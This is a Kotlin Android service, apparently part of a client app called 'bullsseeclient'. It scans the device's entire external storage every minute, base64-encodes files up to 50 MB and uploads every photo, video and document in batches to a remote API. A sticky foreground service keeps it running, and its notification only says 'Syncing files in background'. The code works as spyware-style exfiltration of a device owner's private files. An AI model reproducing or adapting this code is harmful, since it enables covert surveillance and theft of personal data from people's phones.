package com.example.bullsseeclient.services

import android.app.Service
import android.content.Intent
import android.os.Environment
import android.os.IBinder
import android.util.Log
import com.example.bullsseeclient.api.ApiClient
import com.example.bullsseeclient.api.FileDto
import java.io.File
import java.io.FileOutputStream
import java.time.Instant
import java.util.HashSet

class FileService : Service() {
    private val BATCH_SIZE = 10
    private val MAX_BATCH_BYTES = 20 * 1024 * 1024 // 20 MB limit per batch
    private val imageBuffer = mutableListOf<FileDto>()
    private var imageBufferBytes = 0L
    private val videoBuffer = mutableListOf<FileDto>()
    private var videoBufferBytes = 0L
    private val fileBuffer = mutableListOf<FileDto>()
    private var fileBufferBytes = 0L

    // Tracking sent files to avoid duplicates
    private val sentFiles = HashSet<String>()
    private val trackerFile by lazy { File(filesDir, "sent_files.txt") }
    private var isRunning = false

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d("FileService", "Starting file service")
        if (!isRunning) {
            isRunning = true
            Thread {
                loadSentFiles()
                while (isRunning) {
                    try {
                        Log.d("FileService", "Starting scan cycle")
                        scanFiles()
                        Log.d("FileService", "Scan cycle complete, sleeping...")
                        Thread.sleep(60 * 1000) // Scan every 1 minute
                    } catch (e: InterruptedException) {
                        Log.w("FileService", "Service thread interrupted")
                        isRunning = false
                    } catch (e: Exception) {
                        Log.e("FileService", "Error in scan loop", e)
                        try { Thread.sleep(60 * 1000) } catch (ignore: Exception) {}
                    }
                }
            }.start()
        }
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        isRunning = false
    }

    private fun loadSentFiles() {
        try {
            if (trackerFile.exists()) {
                trackerFile.forEachLine { line ->
                    if (line.isNotBlank()) {
                        sentFiles.add(line.trim())
                    }
                }
                Log.d("FileService", "Loaded ${sentFiles.size} sent files from history")
            }
        } catch (e: Exception) {
            Log.e("FileService", "Error loading sent files history", e)
        }
    }

    private fun markBatchAsSent(batch: List<FileDto>) {
        try {
            FileOutputStream(trackerFile, true).bufferedWriter().use { writer ->
                for (file in batch) {
                    val key = getFileKey(file)
                    if (sentFiles.add(key)) {
                        writer.write(key)
                        writer.newLine()
                    }
                }
            }
        } catch (e: Exception) {
            Log.e("FileService", "Error saving sent files history", e)
        }
    }

    private fun getFileKey(file: FileDto): String {
        // Key based on path, size and modification time to detect changes
        return "${file.path}|${file.size}|${file.lastModified}"
    }

    private fun getFileKey(file: File): String {
        return "${file.absolutePath}|${file.length()}|${Instant.ofEpochMilli(file.lastModified())}"
    }

    private fun scanFiles() {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
            Log.w("FileService", "MANAGE_EXTERNAL_STORAGE permission missing. Waiting for user...")
            return
        }

        val root = Environment.getExternalStorageDirectory()
        Log.d("FileService", "Scanning root: ${root.absolutePath} for ALL existing and new files")
        
        imageBuffer.clear()
        imageBufferBytes = 0L
        videoBuffer.clear()
        videoBufferBytes = 0L
        fileBuffer.clear()
        fileBufferBytes = 0L

        walkDir(root)
        
        // Send remaining
        if (imageBuffer.isNotEmpty()) {
            sendBatchSync(imageBuffer.toList(), "image")
            imageBuffer.clear()
            imageBufferBytes = 0L
        }
        if (videoBuffer.isNotEmpty()) {
            sendBatchSync(videoBuffer.toList(), "video")
            videoBuffer.clear()
            videoBufferBytes = 0L
        }
        if (fileBuffer.isNotEmpty()) {
            sendBatchSync(fileBuffer.toList(), "file")
            fileBuffer.clear()
            fileBufferBytes = 0L
        }
    }

    private fun walkDir(dir: File) {
        // Optimization: Skip system directories where user content is unlikely or restricted
        if (dir.name.equals("Android", ignoreCase = true) || 
            dir.name.equals("lost.dir", ignoreCase = true) ||
            dir.name.startsWith(".")) {
            return
        }

        val files = dir.listFiles()
        if (files == null) {
            return
        }
        for (file in files) {
            if (file.isDirectory) {
                walkDir(file)
            } else {
                // Check if already sent
                val key = getFileKey(file)
                if (sentFiles.contains(key)) {
                    continue
                }

                var contentBase64: String? = null
                try {
                    // 50MB limit
                    if (file.length() <= 50 * 1024 * 1024) {
                        val bytes = file.readBytes()
                        contentBase64 = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
                    } else {
                         Log.w("FileService", "Skipping content for large file: ${file.name}")
                    }
                } catch (e: Exception) {
                    Log.e("FileService", "Error reading file ${file.name}", e)
                    continue // Skip this file if we can't read it
                }

                val dto = FileDto(
                    path = file.absolutePath,
                    name = file.name,
                    size = file.length(),
                    lastModified = Instant.ofEpochMilli(file.lastModified()).toString(),
                    content = contentBase64
                )
                
                val name = file.name.lowercase()
                when {
                    isImage(name) -> {
                        imageBuffer.add(dto)
                        imageBufferBytes += dto.size
                        if (imageBuffer.size >= BATCH_SIZE || imageBufferBytes >= MAX_BATCH_BYTES) {
                            sendBatchSync(imageBuffer.toList(), "image")
                            imageBuffer.clear()
                            imageBufferBytes = 0L
                        }
                    }
                    isVideo(name) -> {
                        videoBuffer.add(dto)
                        videoBufferBytes += dto.size
                        if (videoBuffer.size >= BATCH_SIZE || videoBufferBytes >= MAX_BATCH_BYTES) {
                            sendBatchSync(videoBuffer.toList(), "video")
                            videoBuffer.clear()
                            videoBufferBytes = 0L
                        }
                    }
                    else -> {
                        fileBuffer.add(dto)
                        fileBufferBytes += dto.size
                        if (fileBuffer.size >= BATCH_SIZE || fileBufferBytes >= MAX_BATCH_BYTES) {
                            sendBatchSync(fileBuffer.toList(), "file")
                            fileBuffer.clear()
                            fileBufferBytes = 0L
                        }
                    }
                }
            }
        }
    }

    private fun isImage(name: String): Boolean {
        return name.endsWith(".jpg") || name.endsWith(".jpeg") || name.endsWith(".png") || 
               name.endsWith(".gif") || name.endsWith(".bmp") || name.endsWith(".webp") ||
               name.endsWith(".heic") || name.endsWith(".heif") || name.endsWith(".tiff") ||
               name.endsWith(".tif") || name.endsWith(".raw") || name.endsWith(".dng")
    }

    private fun isVideo(name: String): Boolean {
        return name.endsWith(".mp4") || name.endsWith(".avi") || name.endsWith(".mov") || 
               name.endsWith(".wmv") || name.endsWith(".flv") || name.endsWith(".mkv") || 
               name.endsWith(".webm") || name.endsWith(".3gp") || name.endsWith(".m4v") ||
               name.endsWith(".mpeg") || name.endsWith(".mpg") || name.endsWith(".ts")
    }

    private fun sendBatchSync(batch: List<FileDto>, type: String) {
        try {
            val call = when (type) {
                "image" -> ApiClient.api.sendImages(batch)
                "video" -> ApiClient.api.sendVideos(batch)
                else -> ApiClient.api.sendFiles(batch)
            }

            val response = call.execute() // Synchronous call
            if (response.isSuccessful) {
                Log.d("FileService", "Sent $type batch of ${batch.size} files. Code: ${response.code()}")
                markBatchAsSent(batch)
            } else {
                Log.e("FileService", "Failed to send $type batch. Code: ${response.code()}")
                // Do NOT mark as sent, so it will be retried next scan
            }
        } catch (e: Exception) {
            Log.e("FileService", "Exception sending $type batch", e)
        }
    }

    companion object {
        fun start(context: android.content.Context) {
            val intent = Intent(context, FileService::class.java)
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }
    }
    
    override fun onCreate() {
        super.onCreate()
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            val channelId = "FILE_SERVICE_CHANNEL"
            val channel = android.app.NotificationChannel(
                channelId,
                "File Service",
                android.app.NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(android.app.NotificationManager::class.java)
            manager.createNotificationChannel(channel)

            val notification = androidx.core.app.NotificationCompat.Builder(this, channelId)
                .setContentTitle("File Scanning")
                .setContentText("Syncing files in background")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .build()

            startForeground(2001, notification)
        }
    }
}
